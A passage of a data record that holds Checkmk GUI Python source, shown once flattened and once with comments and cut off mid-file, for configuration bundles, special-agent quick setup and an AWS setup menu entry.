load_group_bundles, valid_special_agent_bundle, ) from cmk.gui.watolib.hosts_and_folders import folder_from_request, make_action_link from cmk.gui.watolib.main_menu import ABCMainModule, MainModuleRegistry, MainModuleTopic from cmk.gui.watolib.mode import mode_url, ModeRegistry, redirect, WatoMode from cmk.gui.watolib.rulespecs import rulespec_registry def register(main_module_registry: MainModuleRegistry, mode_registry: ModeRegistry) -> None: mode_registry.register(ModeConfigurationBundle) mode_registry.register(ModeEditConfigurationBundles) mode_registry.register(ModeQuickSetupSpecialAgent) main_module_registry.register(MainModuleQuickSetupAWS) class ModeQuickSetupSpecialAgent(WatoMode): \"\"\" This mode allows to create a new special agent configuration using the quick setup. It is solely restricted to special agent based rules and relies on the RuleGroup.SpecialAgents naming convention of the rulespec entry \"\"\" VAR_NAME=\"varname\" @classmethod def name(cls) -> str: return \"new_special_agent_configuration\" @classmethod def parent_mode(cls) -> type[WatoMode] | None: return ModeEditConfigurationBundles def _breadcrumb_url(self) -> str: return self.mode_url(varname=self._name) def _from_vars(self) -> None: self._name=request.get_ascii_input_mandatory(self.VAR_NAME) if not self._name.startswith(RuleGroupType.SPECIAL_AGENTS.value): raise MKUserError( None, _(\"Add configuration is only available for special agent based rules.\"), ) quick_setup=quick_setup_registry.get(self._name) if quick_setup is None: raise MKUserError(None, _(\"No Configuration Quick setup for %s available\") % self._name) self._quick_setup_id=quick_setup.id @staticmethod def static_permissions() -> Collection[PermissionName]: return[] def ensure_permissions(self) -> None: self._ensure_static_permissions() for domain_definition in BUNDLE_DOMAINS[RuleGroupType.SPECIAL_AGENTS]: pname=domain_definition.permission user.need_permission(pname if \".\" in pname else(\"wato.\" +pname)) def title(self) -> str: title=rulespec_registry[self._name].title assert title is not None return _(\"Add %s configuration\") % title def breadcrumb(self) -> Breadcrumb: with request.stashed_vars(): return super().breadcrumb() def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: return make_simple_form_page_menu( title=_(\"Configuration\"), breadcrumb=breadcrumb, add_cancel_link=True, cancel_url=mode_url(mode_name=ModeEditConfigurationBundles.name(), varname=self._name), ) def page(self) -> None: html.vue_app(app_name=\"quick_setup\", data={\"quick_setup_id\": self._quick_setup_id}) class ModeEditConfigurationBundles(WatoMode): VAR_NAME=\"varname\" VAR_ACTION=\"_action\" VAR_BUNDLE_ID=\"_bundle_id\" @classmethod def name(cls) -> str: return \"edit_configuration_bundles\" @staticmethod def static_permissions() -> Collection[PermissionName]: return[] def ensure_permissions(self) -> None: self._ensure_static_permissions() for domain_definition in BUNDLE_DOMAINS[self._bundle_group_type]: pname=domain_definition.permission user.need_permission(pname if \".\" in pname else(\"wato.\" +pname)) def _from_vars(self) -> None: self._name=request.get_ascii_input_mandatory(self.VAR_NAME) self._bundle_group_type=identify_bundle_group_type(self._name) if self._bundle_group_type not in BUNDLE_DOMAINS: raise MKUserError( None, _(\"No edit configuration bundle implemented for bundle group type '%s'.\") % self._name, ) def _breadcrumb_url(self) -> str: return self.mode_url(varname=self._name) def title(self) -> str: if self._bundle_group_type is RuleGroupType.SPECIAL_AGENTS: title=rulespec_registry[self._name].title assert title is not None return title raise MKGeneralException(\"Not implemented bundle group type\") def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: menu=PageMenu( dropdowns=[ PageMenuDropdown( name=\"configurations\", title=_(\"Configurations\"), topics=[ PageMenuTopic( title=_(\"Configurations\"), entries=[ PageMenuEntry( title=_(\"Add configuration\"), icon_name=\"new\", item=make_simple_link( mode_url( ModeQuickSetupSpecialAgent.name(), varname=self._name ) ), is_shortcut=True, is_suggested=True, ) ], ) ], ) ], breadcrumb=breadcrumb, ) return menu def page(self) -> None: if not active_config.wato_hide_varnames: display_varname=( '%s[\"%s\"]' % tuple(self._name.split(\":\")) if \":\" in self._name else self._name ) html.div(display_varname, class_=\"varname\") self._bundles_listing(self._name) def _bundles_listing(self, group_name: str) -> None: bundle_ids=set(load_group_bundles(group_name).keys()) if not bundle_ids: html.div(_(\"No configuration yet\")) return bundles_with_references=identify_bundle_references(group_name, bundle_ids) if self._bundle_group_type is RuleGroupType.SPECIAL_AGENTS: self._special_agent_bundles_listing(group_name, bundles_with_references) return raise MKGeneralException(\"Not implemented\") def _action_url(self, action: str, bundle_id: BundleId) -> str: vars_: HTTPVariables=[ (\"mode\", request.var(\"mode\", self.name())), (self.VAR_NAME, self._name), (self.VAR_BUNDLE_ID, bundle_id), (self.VAR_ACTION, action), ] return make_action_link(vars_) def action(self) -> ActionResult: check_csrf_token() if not transactions.check_transaction(): return redirect(self.mode_url()) action=request.get_ascii_input_mandatory(self.VAR_ACTION) bundle_id=BundleId(request.get_ascii_input_mandatory(self.VAR_BUNDLE_ID)) if action==\"delete\": delete_config_bundle(bundle_id) return redirect(self.mode_url()) def _special_agent_bundles_listing( self, group_name: str, bundles: Mapping[BundleId, BundleReferences] ) -> None: special_agent_valuespec=rulespec_registry[group_name].valuespec with table_element( table_id=None, title=\"Configurations\", searchable=False, sortable=False, limit=None, foldable=Foldable.FOLDABLE_SAVE_STATE, omit_update_header=True, ) as table: for index,(bundle_id, bundle) in enumerate(sorted(bundles.items())): if not valid_special_agent_bundle(bundle): raise MKGeneralException(f\"Invalid configuration:{bundle_id}\") assert bundle.rules is not None assert bundle.hosts is not None rule_value=bundle.rules[0].value host_name=bundle.hosts[0].name() table.row() table.cell(\" html.write_text_permissive(index +1) self._show_bundle_icons(table, bundle_id) table.cell(\"Name\", css=[]) html.write_text_permissive(bundle_id) table.cell(_(\"Value\"), css=[\"value\"]) html.write_text_permissive( HTMLWriter.render_table( HTMLWriter.render_tr( HTMLWriter.render_td(\"Host name:\", class_=\"title\") +HTMLWriter.render_td(host_name) ) ) ) try: value_html=special_agent_valuespec.value_to_html(rule_value) except Exception as e: try: reason=str(e) special_agent_valuespec.validate_datatype(rule_value, \"\") except Exception as e2: reason=str(e2) value_html=( html.render_icon(\"alert\") +HTML.with_escaping(_(\"The value of this rule is not valid. \")) +escape_to_html_permissive(reason) ) html.write_text_permissive(value_html) def _show_bundle_icons(self, table: Table, bundle_id: BundleId) -> None: table.cell(\"\", css=[\"buttons\"]) html.empty_icon() table.cell(_(\"Actions\"), css=[\"buttons rulebuttons\"]) edit_url=\"\" html.icon_button(url=edit_url, title=_(\"Edit this configuration\"), icon=\"edit\") html.icon_button( url=make_confirm_delete_link( url=self._action_url(\"delete\", bundle_id), title=_(\"Delete configuration %s\") % bundle_id, ), title=_(\"Delete this configuration\"), icon=\"delete\", ) class MainModuleQuickSetupAWS(ABCMainModule): @property def mode_or_url(self) -> str: return mode_url(ModeEditConfigurationBundles.name(), varname=RuleGroup.SpecialAgents(\"aws\")) @property def topic(self) -> MainModuleTopic: return MainModuleTopicQuickSetup @property def title(self) -> str: return _(\"Amazon Web Service(AWS)\") @property def icon(self) -> Icon: return \"quick_setup_aws\" @property def permission(self) -> None | str: return None @property def description(self) -> str: return _(\"Configure Amazon Web Service(AWS) monitoring in Checkmk\") @property def sort_index(self) -> int: return 10 @property def is_show_more(self) -> bool: return False @classmethod def megamenu_search_terms(cls) -> Sequence[str]: return[\"aws\"] class EditDCDConnection(Protocol): def __init__(self) -> None:... def from_vars(self, ident_var: str) -> None:... def page(self, form_name: str) -> None:... def action(self) -> ActionResult:... class ModeConfigurationBundle(WatoMode): edit_dcd_connection_hook: Callable[[], EditDCDConnection | None]=lambda: None @classmethod def name(cls) -> str: return \"edit_configuration_bundle\" @staticmethod def static_permissions() -> Collection[PermissionName]: return[] def ensure_permissions(self) -> None: self._ensure_static_permissions() for domain_definition in BUNDLE_DOMAINS.get(self._rule_group_type,[]): pname=domain_definition.permission user.need_permission(pname if \".\" in pname else(\"wato.\" +pname)) def title(self) -> str: return _(\"Edit configuration: %s\") % self._bundle[\"title\"] def _from_vars(self) -> None: self._bundle_id=request.get_validated_type_input_mandatory(BundleId, \"bundle_id\") bundle_store=ConfigBundleStore().load_for_reading() if self._bundle_id not in bundle_store: raise MKUserError( \"bundle_id\", _('The configuration \"%s\" does not exist.') % self._bundle_id, ) self._bundle: ConfigBundle=bundle_store[self._bundle_id] self._bundle_group=self._bundle[\"group\"] self._bundle_references=identify_bundle_references(self._bundle_group,{self._bundle_id})[ self._bundle_id ] self._rule_group_type=RuleGroupType(self._bundle_group.split(\":\")[0]) match self._rule_group_type: case RuleGroupType.SPECIAL_AGENTS: self._special_agents_from_vars() case _: raise MKUserError( None, _(\"No edit configuration bundle implemented for bundle group type '%s'.\") % self._bundle_group, ) def _special_agents_from_vars(self) -> None: if not all( [ self._bundle_references.rules, self._bundle_references.hosts, self._bundle_references.passwords, ] ): raise MKUserError( None, _(\"The configuration bundle does not contain all required objects.\"), ) assert self._bundle_references.rules assert len(self._bundle_references.rules)==1 assert self._bundle_references.hosts assert len(self._bundle_references.hosts)==1 assert self._bundle_references.passwords ModeEditRule.set_vars(self._bundle_group, self._bundle_references.rules[0].id) self._edit_rule=ModeEditRule() ModeEditHost.set_vars(self._bundle_references.hosts[0].name()) self._edit_host=ModeEditHost() self._edit_dcd_connections: Sequence[EditDCDConnection | None]=[] if self._bundle_references.dcd_connections: for index, dcd_connection in enumerate(self._bundle_references.dcd_connections): request.set_var(f\"dcd_id_{index}\", dcd_connection[0]) self._edit_dcd_connections=[ self.edit_dcd_connection_hook() for _dcd in self._bundle_references.dcd_connections ] for index, edit_dcd_connection in enumerate(self._edit_dcd_connections): if edit_dcd_connection: edit_dcd_connection.from_vars(f\"dcd_id_{index}\") for index, password in enumerate(self._bundle_references.passwords): request.set_var(f\"password_id_{index}\", password[0]) self._edit_passwords=[ModeEditPassword() for _pw in self._bundle_references.passwords] for index, edit_password in enumerate(self._edit_passwords): edit_password.from_vars(f\"password_id_{index}\") @staticmethod def _configuration_vs(bundle_id: str) -> Dictionary: elements: Sequence[DictionaryEntry]=[ (\"_name\", TextInput(title=_(\"Name\"), size=80)), (\"_comment\", RuleComment()), (\"_bundle_id\", FixedValue(title=_(\"Configuration bundle ID\"), value=bundle_id)), ] return Dictionary( title=_(\"Configuration bundle properties\"), optional_keys=False, render=\"form\", elements=elements, ) def _sub_page_configuration(self) -> None: html.h1(_(\"Configuration\"), class_=[\"edit_configuration_bundle_header\"]) with html.form_context(\"edit_bundle\", method=\"POST\"): self._configuration_vs(self._bundle_id).render_input( \"options\", { \"_name\": self._bundle[\"title\"], \"_comment\": self._bundle[\"comment\"], }, ) forms.end() html.hidden_fields() def _sub_page_rule(self) -> None: html.h1(_(\"Rule\"), class_=[\"edit_configuration_bundle_header\"]) self._edit_rule.page() def _sub_page_host(self) -> None: html.h1(_(\"Host\"), class_=[\"edit_configuration_bundle_header\"]) self._edit_host.page() def _sub_page_dcd_connection(self) -> None: if any(edit_dcd_connection for edit_dcd_connection in self._edit_dcd_connections): html.h1(_(\"Dynamic host management\"), class_=[\"edit_configuration_bundle_header\"]) for index, edit_dcd_connection in enumerate(self._edit_dcd_connections): if edit_dcd_connection: edit_dcd_connection.page(f\"edit_dcd_{index}\") def _sub_page_password(self) -> None: if self._edit_passwords: html.h1(_(\"Password\"), class_=[\"edit_configuration_bundle_header\"]) for index, edit_password in enumerate(self._edit_passwords): edit_password.page(f\"edit_password_{index}\") def page(self) -> None: with html.form_context(\"bulk\", method=\"POST\"): forms.end() html.hidden_fields() match self._rule_group_type: case RuleGroupType.SPECIAL_AGENTS: self._sub_page_configuration() self._sub_page_rule() self._sub_page_host() self._sub_page_dcd_connection() self._sub_page_password() case _: raise MKUserError( None, _(\"No edit configuration bundle implemented for bundle group type '%s'.\") % self._bundle_group, ) def _form_names(self) -> Iterator[str]: yield \"edit_bundle\" if self._edit_rule: yield \"rule_editor\" if self._edit_host: yield \"edit_host\" yield from(f\"edit_dcd_{index}\" for index in range(len(self._edit_dcd_connections))) yield from(f\"edit_password_{index}\" for index in range(len(self._edit_passwords))) def _page_menu_action_entries(self) -> Iterator[PageMenuEntry]: form_names=list(self._form_names()) yield PageMenuEntry( title=_(\"Save\"), icon_name=\"services\", item=make_form_bulk_submit_link( bulk_form_name=\"bulk\", form_names=form_names, button_name=\"_save\" ), is_shortcut=False, ) yield PageMenuEntry( title=_(\"Save & go to service discovery\"), icon_name=\"services_green\", item=make_form_bulk_submit_link( bulk_form_name=\"bulk\", form_names=form_names, button_name=\"_save_and_go_to_service_discovery\", ), is_shortcut=True, ) yield PageMenuEntry( title=_(\"Cancel\"), icon_name=\"cancel\", item=make_simple_link(\"\"), is_shortcut=True, ) def _page_menu_related_entries(self) -> Iterator[PageMenuEntry]: yield PageMenuEntry( title=_(\"TBD\"), icon_name=\"\", item=make_simple_link(\"\"), ) def action(self) -> ActionResult: check_csrf_token() if not transactions.check_transaction(): return redirect(self.mode_url(bundle_id=self._bundle_id)) if request.has_var(\"_save\"): self._action_save() return redirect(self.mode_url(bundle_id=self._bundle_id)) if request.has_var(\"_save_and_go_to_service_discovery\"): self._action_save() host=self._edit_host.host folder=folder_from_request(request.var(\"folder\"), host.name()) return redirect(mode_url(\"inventory\", folder=folder.path(), host=host.name())) return redirect(self.mode_url(bundle_id=self._bundle_id)) def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu: return PageMenu( dropdowns=[ PageMenuDropdown( name=\"actions\", title=_(\"Configuration\"), topics=[ PageMenuTopic( title=_(\"Actions\"), entries=list(self._page_menu_action_entries()), ), ], ), PageMenuDropdown( name=\"actions\", title=_(\"Related\"), topics=[ PageMenuTopic( title=_(\"Related\"), entries=list(self._page_menu_related_entries()), ), ], ), ], breadcrumb=breadcrumb, ) def _save_config_bundle_configuration(self) -> None: vs=self._configuration_vs(self._bundle_id) config=vs.from_html_vars(\"edit_bundle_options\") vs.validate_value(config, \"edit_bundle_options\") self._bundle[\"title\"]=config[\"_name\"] self._bundle[\"comment\"]=config[\"_comment\"] edit_config_bundle_configuration(self._bundle_id, self._bundle) def _set_vars(self, all_vars: Mapping[str, Sequence[tuple[str, str]]], form_name: str) -> None: request.del_vars() for var in all_vars[form_name]: request.set_var(var[0].replace(form_name +\"_\", \"\"), var[1]) request.set_var(\"_transid\", transactions.fresh_transid()) transactions.store_new() def _action_save(self) -> None: all_vars={ form_name: list(request.itervars(form_name)) for form_name in self._form_names() } self._save_config_bundle_configuration() if self._edit_host: self._set_vars(all_vars, \"edit_host\") self._edit_host.action() if self._edit_rule: self._set_vars(all_vars, \"rule_editor\") self._edit_rule.action() if self._edit_passwords: for index, edit_password in enumerate(self._edit_passwords): self._set_vars(all_vars, f\"edit_password_{index}\") edit_password.action() if self._edit_dcd_connections: for index, edit_dcd_connection in enumerate(self._edit_dcd_connections): if edit_dcd_connection: self._set_vars(all_vars, f\"edit_dcd_connection_{index}\") edit_dcd_connection.action() ",
                    "sourceWithComments": "#!/usr/bin/env python3\n# Copyright (C) 2024 Checkmk GmbH - License: GNU General Public License v2\n# This file is part of Checkmk (https://checkmk.com). It is subject to the terms and\n# conditions defined in the file COPYING, which is part of this source code package.\n\nfrom collections.abc import Callable, Collection, Iterator, Mapping, Sequence\nfrom typing import Protocol\n\nfrom cmk.ccc.exceptions import MKGeneralException\n\nfrom cmk.utils.rulesets.definition import RuleGroup, RuleGroupType\n\nfrom cmk.gui import forms\nfrom cmk.gui.breadcrumb import Breadcrumb\nfrom cmk.gui.config import active_config\nfrom cmk.gui.exceptions import MKUserError\nfrom cmk.gui.htmllib.generator import HTMLWriter\nfrom cmk.gui.htmllib.html import html\nfrom cmk.gui.http import request\nfrom cmk.gui.i18n import _\nfrom cmk.gui.logged_in import user\nfrom cmk.gui.page_menu import (\n    make_form_bulk_submit_link,\n    make_simple_form_page_menu,\n    make_simple_link,\n    PageMenu,\n    PageMenuDropdown,\n    PageMenuEntry,\n    PageMenuTopic,\n)\nfrom cmk.gui.quick_setup.v0_unstable._registry import quick_setup_registry\nfrom cmk.gui.table import Foldable, Table, table_element\nfrom cmk.gui.type_defs import ActionResult, HTTPVariables, Icon, PermissionName\nfrom cmk.gui.utils.csrf_token import check_csrf_token\nfrom cmk.gui.utils.escaping import escape_to_html_permissive\nfrom cmk.gui.utils.html import HTML\nfrom cmk.gui.utils.transaction_manager import transactions\nfrom cmk.gui.utils.urls import make_confirm_delete_link\nfrom cmk.gui.valuespec import Dictionary, DictionaryEntry, FixedValue, RuleComment, TextInput\nfrom cmk.gui.wato._main_module_topics import MainModuleTopicQuickSetup\nfrom cmk.gui.wato.pages.hosts import ModeEditHost\nfrom cmk.gui.wato.pages.password_store import ModeEditPassword\nfrom cmk.gui.wato.pages.rulesets import ModeEditRule\nfrom cmk.gui.watolib.configuration_bundles import (\n    BUNDLE_DOMAINS,\n    BundleId,\n    BundleReferences,\n    ConfigBundle,\n    ConfigBundleStore,\n    delete_config_bundle,\n    edit_config_bundle_configuration,\n    identify_bundle_group_type,\n    identify_bundle_references,\n    load_group_bundles,\n    valid_special_agent_bundle,\n)\nfrom cmk.gui.watolib.hosts_and_folders import folder_from_request, make_action_link\nfrom cmk.gui.watolib.main_menu import ABCMainModule, MainModuleRegistry, MainModuleTopic\nfrom cmk.gui.watolib.mode import mode_url, ModeRegistry, redirect, WatoMode\nfrom cmk.gui.watolib.rulespecs import rulespec_registry\n\n\ndef register(main_module_registry: MainModuleRegistry, mode_registry: ModeRegistry) -> None:\n    mode_registry.register(ModeConfigurationBundle)\n    mode_registry.register(ModeEditConfigurationBundles)\n    mode_registry.register(ModeQuickSetupSpecialAgent)\n    main_module_registry.register(MainModuleQuickSetupAWS)\n\n\nclass ModeQuickSetupSpecialAgent(WatoMode):\n    \"\"\"\n    This mode allows to create a new special agent configuration using the quick setup. It\n    is solely restricted to special agent based rules and relies on the RuleGroup.SpecialAgents\n    naming convention of the rulespec entry\n    \"\"\"\n\n    VAR_NAME = \"varname\"\n\n    @classmethod\n    def name(cls) -> str:\n        return \"new_special_agent_configuration\"\n\n    @classmethod\n    def parent_mode(cls) -> type[WatoMode] | None:\n        return ModeEditConfigurationBundles\n\n    def _breadcrumb_url(self) -> str:\n        return self.mode_url(varname=self._name)\n\n    def _from_vars(self) -> None:\n        self._name = request.get_ascii_input_mandatory(self.VAR_NAME)\n        if not self._name.startswith(RuleGroupType.SPECIAL_AGENTS.value):\n            raise MKUserError(\n                None,\n                _(\"Add configuration is only available for special agent based rules.\"),\n            )\n\n        quick_setup = quick_setup_registry.get(self._name)\n        if quick_setup is None:\n            raise MKUserError(None, _(\"No Configuration Quick setup for %s available\") % self._name)\n        self._quick_setup_id = quick_setup.id\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return []\n\n    def ensure_permissions(self) -> None:\n        self._ensure_static_permissions()\n        for domain_definition in BUNDLE_DOMAINS[RuleGroupType.SPECIAL_AGENTS]:\n            pname = domain_definition.permission\n            user.need_permission(pname if \".\" in pname else (\"wato.\" + pname))\n\n    def title(self) -> str:\n        title = rulespec_registry[self._name].title\n        assert title is not None\n        return _(\"Add %s configuration\") % title\n\n    def breadcrumb(self) -> Breadcrumb:\n        with request.stashed_vars():\n            return super().breadcrumb()\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        return make_simple_form_page_menu(\n            title=_(\"Configuration\"),\n            breadcrumb=breadcrumb,\n            add_cancel_link=True,\n            cancel_url=mode_url(mode_name=ModeEditConfigurationBundles.name(), varname=self._name),\n        )\n\n    def page(self) -> None:\n        html.vue_app(app_name=\"quick_setup\", data={\"quick_setup_id\": self._quick_setup_id})\n\n\nclass ModeEditConfigurationBundles(WatoMode):\n    VAR_NAME = \"varname\"\n    VAR_ACTION = \"_action\"\n    VAR_BUNDLE_ID = \"_bundle_id\"\n\n    @classmethod\n    def name(cls) -> str:\n        return \"edit_configuration_bundles\"\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return []\n\n    def ensure_permissions(self) -> None:\n        self._ensure_static_permissions()\n        for domain_definition in BUNDLE_DOMAINS[self._bundle_group_type]:\n            pname = domain_definition.permission\n            user.need_permission(pname if \".\" in pname else (\"wato.\" + pname))\n\n    def _from_vars(self) -> None:\n        self._name = request.get_ascii_input_mandatory(self.VAR_NAME)\n        self._bundle_group_type = identify_bundle_group_type(self._name)\n        if self._bundle_group_type not in BUNDLE_DOMAINS:\n            raise MKUserError(\n                None,\n                _(\"No edit configuration bundle implemented for bundle group type '%s'.\")\n                % self._name,\n            )\n\n    def _breadcrumb_url(self) -> str:\n        return self.mode_url(varname=self._name)\n\n    def title(self) -> str:\n        if self._bundle_group_type is RuleGroupType.SPECIAL_AGENTS:\n            title = rulespec_registry[self._name].title\n            assert title is not None\n            return title\n        raise MKGeneralException(\"Not implemented bundle group type\")\n\n    def page_menu(self, breadcrumb: Breadcrumb) -> PageMenu:\n        menu = PageMenu(\n            dropdowns=[\n                PageMenuDropdown(\n                    name=\"configurations\",\n                    title=_(\"Configurations\"),\n                    topics=[\n                        PageMenuTopic(\n                            title=_(\"Configurations\"),\n                            entries=[\n                                PageMenuEntry(\n                                    title=_(\"Add configuration\"),\n                                    icon_name=\"new\",\n                                    item=make_simple_link(\n                                        mode_url(\n                                            ModeQuickSetupSpecialAgent.name(), varname=self._name\n                                        )\n                                    ),\n                                    is_shortcut=True,\n                                    is_suggested=True,\n                                )\n                            ],\n                        )\n                    ],\n                )\n            ],\n            breadcrumb=breadcrumb,\n        )\n        return menu\n\n    def page(self) -> None:\n        if not active_config.wato_hide_varnames:\n            display_varname = (\n                '%s[\"%s\"]' % tuple(self._name.split(\":\")) if \":\" in self._name else self._name\n            )\n            html.div(display_varname, class_=\"varname\")\n\n        self._bundles_listing(self._name)\n\n    def _bundles_listing(self, group_name: str) -> None:\n        bundle_ids = set(load_group_bundles(group_name).keys())\n        if not bundle_ids:\n            # TODO (CMK-18347): add redesigned overview for empty configurations\n            html.div(_(\"No configuration yet\"))\n            return\n\n        bundles_with_references = identify_bundle_references(group_name, bundle_ids)\n        if self._bundle_group_type is RuleGroupType.SPECIAL_AGENTS:\n            self._special_agent_bundles_listing(group_name, bundles_with_references)\n            return\n\n        raise MKGeneralException(\"Not implemented\")\n\n    def _action_url(self, action: str, bundle_id: BundleId) -> str:\n        vars_: HTTPVariables = [\n            (\"mode\", request.var(\"mode\", self.name())),\n            (self.VAR_NAME, self._name),\n            (self.VAR_BUNDLE_ID, bundle_id),\n            (self.VAR_ACTION, action),\n        ]\n        return make_action_link(vars_)\n\n    def action(self) -> ActionResult:\n        check_csrf_token()\n        if not transactions.check_transaction():\n            return redirect(self.mode_url())\n\n        action = request.get_ascii_input_mandatory(self.VAR_ACTION)\n        bundle_id = BundleId(request.get_ascii_input_mandatory(self.VAR_BUNDLE_ID))\n        if action == \"delete\":\n            delete_config_bundle(bundle_id)\n\n        return redirect(self.mode_url())\n\n    def _special_agent_bundles_listing(\n        self, group_name: str, bundles: Mapping[BundleId, BundleReferences]\n    ) -> None:\n        special_agent_valuespec = rulespec_registry[group_name].valuespec\n        with table_element(\n            table_id=None,\n            title=\"Configurations\",\n            searchable=False,\n            sortable=False,\n            limit=None,\n            foldable=Foldable.FOLDABLE_SAVE_STATE,\n            omit_update_header=True,\n        ) as table:\n            for index, (bundle_id, bundle) in enumerate(sorted(bundles.items())):\n                if not valid_special_agent_bundle(bundle):\n                    raise MKGeneralException(f\"Invalid configuration: {bundle_id}\")\n                assert bundle.rules is not None\n                assert bundle.hosts is not None\n                rule_value = bundle.rules[0].value\n                host_name = bundle.hosts[0].name()\n                table.row()\n\n                table.cell(\"#\", css=[\"narrow nowrap\"])\n                html.write_text_permissive(index + 1)\n\n                self._show_bundle_icons(table, bundle_id)\n\n                table.cell(\"Name\", css=[])\n                html.write_text_permissive(bundle_id)\n\n                table.cell(_(\"Value\"), css=[\"value\"])\n\n                # We use the same table layout for the host name to have the same format as for\n                # the rule rendering\n                html.write_text_permissive(\n                    HTMLWriter.render_table(\n                        HTMLWriter.render_tr(\n                            HTMLWriter.render_td(\"Host name:\", class_=\"title\")\n                            + HTMLWriter.render_td(host_name)\n                        )\n                    )\n                )\n                try:\n                    value_html = special_agent_valuespec.value_to_html(rule_value)\n                except Exception as e:\n                    try:\n                        reason = str(e)\n                        special_agent_valuespec.validate_datatype(rule_value, \"\")\n                    except Exception as e2:\n                        reason = str(e2)\n\n                    value_html = (\n                        html.render_icon(\"alert\")\n                        + HTML.with_escaping(_(\"The value of this rule is not valid. \"))\n                        + escape_to_html_permissive(reason)\n                    )\n                html.write_text_permissive(value_html)\n\n    def _show_bundle_icons(self, table: Table, bundle_id: BundleId) -> None:\n        table.cell(\"\", css=[\"buttons\"])\n        html.empty_icon()\n\n        table.cell(_(\"Actions\"), css=[\"buttons rulebuttons\"])\n        edit_url = \"\"  # TODO: introduce edit button\n        html.icon_button(url=edit_url, title=_(\"Edit this configuration\"), icon=\"edit\")\n\n        html.icon_button(\n            url=make_confirm_delete_link(\n                url=self._action_url(\"delete\", bundle_id),\n                title=_(\"Delete configuration %s\") % bundle_id,\n            ),\n            title=_(\"Delete this configuration\"),\n            icon=\"delete\",\n        )\n\n\nclass MainModuleQuickSetupAWS(ABCMainModule):\n    @property\n    def mode_or_url(self) -> str:\n        return mode_url(ModeEditConfigurationBundles.name(), varname=RuleGroup.SpecialAgents(\"aws\"))\n\n    @property\n    def topic(self) -> MainModuleTopic:\n        return MainModuleTopicQuickSetup\n\n    @property\n    def title(self) -> str:\n        return _(\"Amazon Web Service (AWS)\")\n\n    @property\n    def icon(self) -> Icon:\n        return \"quick_setup_aws\"\n\n    @property\n    def permission(self) -> None | str:\n        return None\n\n    @property\n    def description(self) -> str:\n        return _(\"Configure Amazon Web Service (AWS) monitoring in Checkmk\")\n\n    @property\n    def sort_index(self) -> int:\n        return 10\n\n    @property\n    def is_show_more(self) -> bool:\n        return False\n\n    @classmethod\n    def megamenu_search_terms(cls) -> Sequence[str]:\n        return [\"aws\"]\n\n\nclass EditDCDConnection(Protocol):\n    def __init__(self) -> None: ...\n\n    def from_vars(self, ident_var: str) -> None: ...\n\n    def page(self, form_name: str) -> None: ...\n\n    def action(self) -> ActionResult: ...\n\n\nclass ModeConfigurationBundle(WatoMode):\n    edit_dcd_connection_hook: Callable[[], EditDCDConnection | None] = lambda: None\n\n    @classmethod\n    def name(cls) -> str:\n        return \"edit_configuration_bundle\"\n\n    @staticmethod\n    def static_permissions() -> Collection[PermissionName]:\n        return []\n\n    def ensure_permissions(self) -> None:\n        self._ensure_static_permissions()\n        for domain_definition in BUNDLE_DOMAINS.get(self._rule_group_type, []):\n            pname = domain_definition.permission\n            user.need_permission(pname if \".\" in pname else (\"wato.\" + pname))\n\n    def title(self) -> str:\n        return _(\"Edit configuration: %s\") % self._bundle[\"title\"]\n\n    def _from_vars(self) -> None:\n        self._bundle_id = request.get_validated_type_input_mandatory(BundleId, \"bundle_id\")\n        bundle_store = ConfigBundleStore().load_for_reading()\n        if self._bundle_id not in bundle_store:\n            raise MKUserError(\n                \"bundle_id\",\n                _('The configuration \"%s\" does not exist.') % self._bundle_id,\n            )\n        self._bundle: ConfigBundle = bundle_store[self._bundle_id]\n        self._bundle_group = self._bundle[\"group\"]\n        self._bundle_references = identify_bundle_references(self._bundle_group, {self._bundle_id})[\n            self._bundle_id\n        ]\n\n        self._rule_group_type = RuleGroupType(self._bundle_group.split(\":\")[0])\n        match self._rule_group_type:\n            case RuleGroupType.SPECIAL_AGENTS:\n                self._special_agents_from_vars()\n            case _:\n                raise MKUserError(\n                    None,\n                    _(\"No edit configuration bundle implemented for bundle group type '%s'.\")\n                    % self._bundle_group,\n                )\n\n    def _special_agents_from_vars(self) -> None:\n        if not all(\n            [\n                self._bundle_references.rules,\n                self._bundle_references.hosts,\n                self._bundle_references.passwords,\n            ]\n        ):\n            raise MKUserError(\n                None,\n                _(\"The configuration bundle does not contain all required objects.\"),\n            )\n\n        assert self._bundle_references.rules\n        assert len(self._bundle_references.rules) == 1\n        assert self._bundle_references.hosts\n        assert len(self._bundle_references.hosts) == 1\n        assert self._bundle_references.passwords\n\n        # Rule\n        ModeEditRule.set_vars(self._bundle_group, self._bundle_references.rules[0].id)\n        self._edit_rule = ModeEditRule()\n\n        # Host\n        ModeEditHost.set_vars(self._bundle_references.hosts[0].name())\n        self._edit_host = ModeEditHost()\n\n        # DCD connections\n        self._edit_dcd_connections: Sequence[EditDCDConnection | None] = []\n        if self._bundle_references.dcd_connections:\n            for index, dcd_connection in enumerate(self._bundle_references.dcd_connections):\n                request.set_var(f\"dcd_id_{index}\", dcd_connection[0])\n\n            self._edit_dcd_connections = [\n                self.edit_dcd_connection_hook() for _dcd in self._bundle_references.dcd_connections\n            ]\n            for index, edit_dcd_connection in enumerate(self._edit_dcd_connections):\n                if edit_dcd_connection:\n                    edit_dcd_connection.from_vars(f\"dcd_id_{index}\")\n\n        # Passwords\n        for index, password in enumerate(self._bundle_references.passwords):\n            request.set_var(f\"password_id_{index}\", password[0])\n        self._edit_passwords = [ModeEditPassword() for _pw in self._bundle_references.passwords]\n        for index, edit_password in enumerate(self._edit_passwords):\n            edit_password.from_vars(f\"password_id_{index}\")\n\n    @staticmethod\n    def _configuration_vs(bundle_id: str) -> Dictionary:\n        elements: Sequence[DictionaryEntry] = [\n            (\"_name\", TextInput(title=_(\"Name\"), size=80)),\n            (\"_comment\", RuleComment()),\n            (\"_bundle_id\", FixedValue(title=_(\"Configuration bundle ID\"), value=bundle_id)),\n        ]\n        return Dictionary(\n            title=_(\"Configuration bundle properties\"),\n            optional_keys=False,\n            render=\"form\",\n            elements=elements,\n        )\n\n    def _sub_page_configuration(self) -> None:\n        html.h1(_(\"Configuration\"), class_=[\"edit_configuration_bundle_header\"])\n        with html.form_context(\"edit_bundle\", method=\"POST\"):\n            self._configuration_vs(self._bundle_id).render_input(\n                \"options\",\n                {\n                    \"_name\": 